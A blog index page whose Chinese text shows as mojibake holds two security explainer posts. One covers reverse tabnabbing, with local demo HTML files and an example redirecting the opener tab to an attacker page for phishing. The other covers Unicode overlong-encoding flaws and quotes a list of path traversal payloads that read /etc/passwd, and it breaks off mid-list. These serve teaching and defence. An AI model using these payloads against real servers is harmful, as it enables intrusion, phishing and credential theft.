<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="singsing&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="singsing&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="singsing">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>singsing's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">singsing's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-é¦–é¡µ">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-å…³äº">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-æ ‡ç­¾">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-åˆ†ç±»">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-å½’æ¡£">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/" class="post-title-link" itemprop="url">Reverse Tab Nabbingï¼ˆåå‘æ ‡ç­¾åŠ«æŒï¼‰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-17 15:03:16 / Modified: 15:04:17" itemprop="dateCreated datePublished" datetime="2022-04-17T15:03:16+08:00">2022-04-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%92%93%E9%B1%BC/" itemprop="url" rel="index"><span itemprop="name">é’“é±¼</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Reverse-Tab-Nabbingï¼ˆåå‘æ ‡ç­¾åŠ«æŒï¼‰"><a href="#Reverse-Tab-Nabbingï¼ˆåå‘æ ‡ç­¾åŠ«æŒï¼‰" class="headerlink" title="Reverse Tab Nabbingï¼ˆåå‘æ ‡ç­¾åŠ«æŒï¼‰"></a>Reverse Tab Nabbingï¼ˆåå‘æ ‡ç­¾åŠ«æŒï¼‰</h1><h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å½“æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ A é¡µé¢ä¸­åŒ…å«<code>target=&quot;_blank&quot; rel=&quot;opener&quot;</code>å±æ€§çš„ <code>&lt;a&gt;</code> æ ‡ç­¾çš„ <code>href</code> çš„å€¼æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ <code>href</code> å±æ€§å°† <code>&lt;a&gt;</code> æ ‡ç­¾æŒ‡å‘ B é¡µé¢ï¼ˆæ¶æ„é¡µé¢ï¼‰ã€‚è¯±å¯¼å—å®³è€…ç‚¹å‡»Aé¡µé¢çš„ <code>&lt;a&gt;</code> æ ‡ç­¾åï¼Œæµè§ˆå™¨å°†è½¬è·³è‡³ B é¡µé¢ï¼ˆæ¶æ„é¡µé¢ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨B é¡µé¢ï¼ˆæ¶æ„é¡µé¢ï¼‰è®¾ç½®çš„ JavaScript å¯¹è±¡ï¼ˆwindow.openerï¼‰ï¼Œå¼ºåˆ¶åœ¨åŸæ¥ a é¡µé¢æ‰€åœ¨çš„çª—å£æ‰“å¼€å¦ä¸€ä¸ªé¡µé¢ Cã€‚</p>
<p>å³ä½¿ A é¡µé¢ä¸­çš„ <code>&lt;a&gt;</code> æ ‡ç­¾å±æ€§ä¸­ä¸åŒ…å« **<code>rel=&quot;opener&quot;</code>**ï¼Œä½†åŒ…å« <strong><code>target=&quot;_blank&quot;</code></strong> çš„æƒ…å†µä¸‹ï¼Œä¸Šè¿°æŠ€æœ¯ä¹Ÿå¯èƒ½å®ç°ã€‚å‰ææ˜¯ <code>&lt;a&gt;</code> æ ‡ç­¾ä¸­æ²¡æœ‰åŒ…å« <code>rel=&quot;noopener&quot;</code> æˆ– <code>rel=&quot;noreferrer&quot;</code>çš„å±æ€§ï¼Œæˆ–è€…æµè§ˆå™¨å¯¹ <code>&lt;a&gt;</code> æ ‡ç­¾è®¾ç½®çš„é»˜è®¤å±æ€§å€¼ä¸ä¸º <code>rel=&quot;noopener&quot;</code> æˆ– <code>rel=&quot;noreferrer&quot;</code>ã€‚</p>
<p>åŸºäºä¸Šè¿°æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ B é¡µé¢ï¼ˆæ¶æ„é¡µé¢ï¼‰è®¾ç½® <code>window.opener.location = https://attacker.com/victim.html</code> ã€‚å¹¶ä¸”å°† C é¡µé¢æ¨¡ä»¿æˆä¸åŸæ¥çš„ A é¡µé¢ä¸€æ ·ï¼Œè¯±éª—å—å®³è€…è¾“å…¥è´¦å·å¯†ç è¿›è¡Œé’“é±¼ï¼Œæˆ–è€…æ‰§è¡Œå…¶ä»– JavaScript æ”»å‡»ã€‚ </p>
<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><h3 id="With-back-link"><a href="#With-back-link" class="headerlink" title="With back link"></a>With back link</h3><p>ä¸ä½¿ç”¨ <code>rel=&quot;noopener&quot;</code> æˆ– <code>rel=&quot;noreferrer&quot;</code> å±æ€§æ—¶çˆ¶é¡µé¢å’Œå­é¡µé¢ä¹‹é—´çš„é“¾æ¥ï¼š</p>
<p><img src="https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png"></p>
<h3 id="Without-back-link"><a href="#Without-back-link" class="headerlink" title="Without back link"></a>Without back link</h3><p>ä½¿ç”¨ <code>rel=&quot;noopener&quot;</code> æˆ– <code>rel=&quot;noreferrer&quot;</code> å±æ€§æ—¶çˆ¶é¡µé¢å’Œå­é¡µé¢ä¹‹é—´çš„é“¾æ¥ï¼š</p>
<p><img src="https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png"></p>
<h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹ "></a>ç¤ºä¾‹ <a href="#examples" id="examples"></a></h3><p>åœ¨æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä»¥ä¸‹é¡µé¢å¹¶ä½¿ç”¨ <code>python3 -m http.server</code> è¿è¡Œ Web æœåŠ¡å™¨<br>ç„¶åï¼Œè®¿é—® <code>http://127.0.0.1:8000/vulnerable.html</code>ï¼Œç‚¹å‡»é“¾æ¥å¹¶è§‚å¯Ÿ <strong>åŸå§‹Tab</strong> çš„ URL å˜åŒ–ã€‚</p>
<ul>
<li><p><strong>vulnerable.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Victim Site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1:8000/malicious.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;opener&quot;</span>&gt;</span>Controlled by the attacker<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>malicious.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span> = <span class="string">&quot;http://127.0.0.1:8000/malicious_redir.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>malicious_redir.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>New Malicious Site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="å¯è®¿é—®çš„å±æ€§"><a href="#å¯è®¿é—®çš„å±æ€§" class="headerlink" title="å¯è®¿é—®çš„å±æ€§ "></a>å¯è®¿é—®çš„å±æ€§ <a href="#accessible-properties" id="accessible-properties"></a></h3><p>åœ¨è·¨åŸŸè®¿é—®çš„æƒ…å†µä¸‹ï¼Œæ¶æ„ç«™ç‚¹åªèƒ½ä» <strong>window.opener</strong> javascript å¯¹è±¡å¼•ç”¨(è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ª<strong>Window</strong> javascriptç±»å®ä¾‹çš„å¼•ç”¨)è®¿é—®ä»¥ä¸‹å±æ€§:</p>
<ul>
<li><code>opener.closed</code>: Returns a boolean value indicating whether a window has been closed or not.</li>
<li><code>opener.frames</code>: Returns all iframe elements in the current window.</li>
<li><code>opener.length</code>: Returns the number of iframe elements in the current window.</li>
<li><code>opener.opener</code>: Returns a reference to the window that created the window.</li>
<li><code>opener.parent</code>: Returns the parent window of the current window.</li>
<li><code>opener.self</code>: Returns the current window.</li>
<li><code>opener.top</code>: Returns the topmost browser window.</li>
</ul>
<p>å¦‚æœåŸŸæ˜¯ç›¸åŒçš„ï¼Œé‚£ä¹ˆæ¶æ„ç«™ç‚¹å¯ä»¥è®¿é—®ç”±<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Window"><strong>window</strong></a> javascriptå¯¹è±¡å¼•ç”¨çš„æ‰€æœ‰å±æ€§ã€‚</p>
<h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>é˜²å¾¡å†…å®¹åœ¨ <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing">HTML5 å¤‡å¿˜å•</a> ä¸­ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing">https://owasp.org/www-community/attacks/Reverse_Tabnabbing</a></p>
<hr>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/13/Unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/13/Unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">Unicode ç›¸å…³æ¼æ´åŠåˆ©ç”¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-13 19:49:45 / Modified: 20:17:01" itemprop="dateCreated datePublished" datetime="2022-04-13T19:49:45+08:00">2022-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">æ¸—é€æµ‹è¯•</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="unicode-ç›¸å…³æ¼æ´"><a href="#unicode-ç›¸å…³æ¼æ´" class="headerlink" title="unicode ç›¸å…³æ¼æ´"></a>unicode ç›¸å…³æ¼æ´</h1><h2 id="0x01-unicode-çš„è§£æé”™è¯¯æ¼æ´"><a href="#0x01-unicode-çš„è§£æé”™è¯¯æ¼æ´" class="headerlink" title="0x01- unicode çš„è§£æé”™è¯¯æ¼æ´"></a>0x01- unicode çš„è§£æé”™è¯¯æ¼æ´</h2><p>ä¹Ÿè®¸ä¸è¯¥å«æ¼æ´ï¼Œä½†å®åœ¨ä¸çŸ¥é“ç”¨ä»€ä¹ˆæè¿°æ¯”è¾ƒé€‚ç”¨ï¼ï¼</p>
<h3 id="å¥‡æ€ªçš„-payload"><a href="#å¥‡æ€ªçš„-payload" class="headerlink" title="å¥‡æ€ªçš„ payload"></a>å¥‡æ€ªçš„ payload</h3><p>ä»¥å‰åœ¨è¿›è¡Œä¸€äº›æšä¸¾çš„æ—¶å€™ï¼Œä¼šå‘ç°å­—å…¸é‡Œé¢æœ‰ä¸€äº›å¾ˆå¥‡æ€ªçš„ payloadï¼Œä½†ä¸€ç›´æ²¡æœ‰æ€è€ƒä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Œåªæ˜¯å¥‰è¡Œ â€œæ‹¿æ¥ä¸»ä¹‰â€ï¼Œç›´æ¥ä½¿ç”¨ï¼Œç›´è‡³æœ€è¿‘æ‰çªç„¶æƒ³ç†æ¸…æ¥šè¿™äº›åŸç†ã€‚**â€å¥‡æ€ªçš„ payloadâ€** å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># ä»¥ä¸‹ payload æ¥è‡ªè‘—åFUZZå·¥å…·--WFUZZå†…ç½®å­—å…¸ï¼šhttps://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt</span><br><span class="line"></span><br><span class="line">..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">...</span><br><span class="line">..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="åˆ¨æ ¹é—®åº•"><a href="#åˆ¨æ ¹é—®åº•" class="headerlink" title="åˆ¨æ ¹é—®åº•"></a>åˆ¨æ ¹é—®åº•</h3><p>payload ä¸­ï¼Œä¸ºä»€ä¹ˆä¼šå­˜åœ¨ä½¿ç”¨ <code>%C0%AF</code> æˆ– <code>%C0%2F</code> ä»£æ›¿ <code>/</code> çš„æƒ…å†µï¼Ÿå¯¹äºç›®å½•éå†æ¼æ´ï¼Œè¿™ç§ä»£æ›¿çœŸçš„æœ‰æ•ˆå—ï¼ï¼Ÿå…¶å®ï¼Œå¯¹äºä¸€äº›æ¯”è¾ƒæ¸£çš„ Unicode è§£æåº”ç”¨ç¨‹åºæ˜¯çœŸçš„æœ‰æ•ˆçš„ã€‚</p>
<h4 id="å‰æçŸ¥è¯†ç‚¹ä¸€ï¼šURLç¼–ç çŸ¥è¯†"><a href="#å‰æçŸ¥è¯†ç‚¹ä¸€ï¼šURLç¼–ç çŸ¥è¯†" class="headerlink" title="å‰æçŸ¥è¯†ç‚¹ä¸€ï¼šURLç¼–ç çŸ¥è¯†"></a><strong>å‰æçŸ¥è¯†ç‚¹ä¸€ï¼šURLç¼–ç çŸ¥è¯†</strong></h4><p>URL ç¼–ç ä¹Ÿç§°ä¸ºç™¾åˆ†æ¯”ç¼–ç ï¼Œæ˜¯ä¸€ç§ç®€å•ç¼–ç æ–¹å¼ï¼ŒURLç¼–ç ä¸­çš„ <code>%xx</code> è¡¨ç¤ºä¸€ä¸ªå­—èŠ‚ï¼ˆ0-255 çš„æ•°å­—ï¼‰ï¼Œå…¶ä¸­æ¯ä¸ª <code>x</code> æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶æ•°å­—ã€‚å› æ­¤ï¼ŒURL ä¸­çš„ <code>%C0%AF</code> å¯¹åº”äºå°†å­—èŠ‚ <code>C0 AF</code> æ”¾å…¥è§£ç åçš„ URLï¼Œå³ å­—èŠ‚ 192 (<code>1100 0000</code>) å’Œå­—èŠ‚ 175 (<code>1010 1111</code>)ï¼Œè€Œ <code>%C0%2F</code> å¯¹åº”äºå­—èŠ‚ 192 (<code>1100 0000</code>) å’Œå­—èŠ‚ 47 (<code>0010 1111</code>)</p>
<h4 id="å‰æçŸ¥è¯†ç‚¹äºŒï¼šUTF-8-ç¼–ç çŸ¥è¯†"><a href="#å‰æçŸ¥è¯†ç‚¹äºŒï¼šUTF-8-ç¼–ç çŸ¥è¯†" class="headerlink" title="å‰æçŸ¥è¯†ç‚¹äºŒï¼šUTF-8 ç¼–ç çŸ¥è¯†"></a><strong>å‰æçŸ¥è¯†ç‚¹äºŒï¼šUTF-8 ç¼–ç çŸ¥è¯†</strong></h4><p>UTF-8ä½¿ç”¨çš„æ˜¯ <strong>8ä½ç å…ƒ</strong> çš„å˜é•¿ç å…ƒåºåˆ—ç¼–ç æ–¹å¼ï¼ˆä¸€ç å…ƒ &#x3D; <code>1 byte</code> &#x3D; <code>8 bits</code>ï¼‰ã€‚æ³¨æ„ï¼ŒUTF-8çš„ç å…ƒé•¿åº¦æ˜¯å›ºå®šçš„8ä½ï¼Œä½†ç¼–ç åå½¢æˆçš„ç å…ƒåºåˆ—é•¿åº¦ä¸æ˜¯å›ºå®šçš„ã€‚UTF-8ä¸€èˆ¬ä½¿ç”¨1åˆ°4ä¸ªå­—èŠ‚ç¼–ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ›´é•¿ã€‚ä¾‹å¦‚ï¼š</p>
<ol>
<li>ä¸€ç å…ƒï¼ˆ<code>1 byte</code> &#x3D; <code>8 bits</code>ï¼‰åºåˆ—é•¿åº¦å­—ç¬¦è¡¨ç¤ºä¸ºï¼š<code>0xxxxxxx</code>ï¼›</li>
<li>åŒç å…ƒï¼ˆ<code>2 byte</code> &#x3D; <code>16 bits</code>ï¼‰åºåˆ—é•¿åº¦å­—ç¬¦è¡¨ç¤ºä¸ºï¼š<code>110xxxxx 10xxxxxx</code>ï¼›</li>
<li>ä¸‰ç å…ƒï¼ˆ<code>3 byte</code> &#x3D; <code>24 bits</code>ï¼‰åºåˆ—é•¿åº¦å­—ç¬¦è¡¨ç¤ºä¸ºï¼š<code>1110xxxx 10xxxxxx 10xxxxxx</code> ï¼›</li>
<li>å››ç å…ƒï¼ˆ<code>4 byte</code> &#x3D; <code>32 bits</code>ï¼‰åºåˆ—é•¿åº¦å­—ç¬¦è¡¨ç¤ºä¸ºï¼š<code>1110xxxx 10xxxxxx 10xxxxxx 10xxxxxx</code> ï¼›</li>
</ol>
<p>æ‰€ä»¥ã€‚å¦‚æŸä¸ªå­—ç¬¦åœ¨ ASCII å­—ç¬¦é›†å†…ï¼Œç”±äºå…¶å€¼åªéœ€è¦ä¸€ç å…ƒï¼ˆ<code>1 byte</code> &#x3D; <code>8 bits</code>ï¼‰å°±å¯ä»¥è¡¨ç¤ºï¼Œæ‰€ä»¥è¯¥å­—ç¬¦ç»è¿‡ UTF-8 ç¼–ç åï¼Œè¡¨ç¤ºä¸º <code>0xxxxxxx</code> ï¼Œè¡¨ç¤ºæ–¹å¼ä»ç„¶ä¸åŸå§‹çš„ ASCII æ–‡æ¡£çš„ç¼–ç ç›¸åŒã€‚</p>
<p><strong>UTF-8ç¼–ç æ–¹å¼çš„ç®—æ³•ï¼š</strong> </p>
<p>é¦–å­—èŠ‚ç”¨äºåŒºåˆ†ç¼–ç çš„å­—èŠ‚æ•°ï¼Œå³ï¼Œä»é¦–å­—èŠ‚å°±èƒ½åˆ¤æ–­å‡ºç¼–ç åæœ‰å¤šå°‘ä¸ªå­—èŠ‚ã€‚è§„åˆ™ä¸ºï¼šé™¤å•å­—èŠ‚ç¼–ç ä»¥ <code>0</code> å¼€å¤´å¤–ï¼Œå¤šå­—èŠ‚ç¼–ç é¦–å­—èŠ‚ <code>1</code> çš„ä¸ªæ•°ç”¨äºåˆ¤æ–­ç¼–ç åçš„å­—èŠ‚é•¿åº¦ï¼Œç„¶åç´§æ¥ç€ä»¥æ•°å­— <code>0</code> ä½œä¸ºç»ˆç»“æ ‡å¿—ï¼Œé™¤é¦–å­—èŠ‚å¤–ï¼Œå¤šå­—èŠ‚ç¼–ç çš„åç»­å­—èŠ‚ä»¥ <code>10</code> å¼€å¤´ï¼Œå…·ä½“è§„åˆ™å¦‚è¡¨5æ‰€ç¤º</p>
<p><img src="https://img-blog.csdnimg.cn/20201231182051351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5b25naWxmbW1t,size_16,color_FFFFFF,t_70"></p>
<p><strong>UTF-8ç¼–ç æ–¹æ³•</strong></p>
<ol>
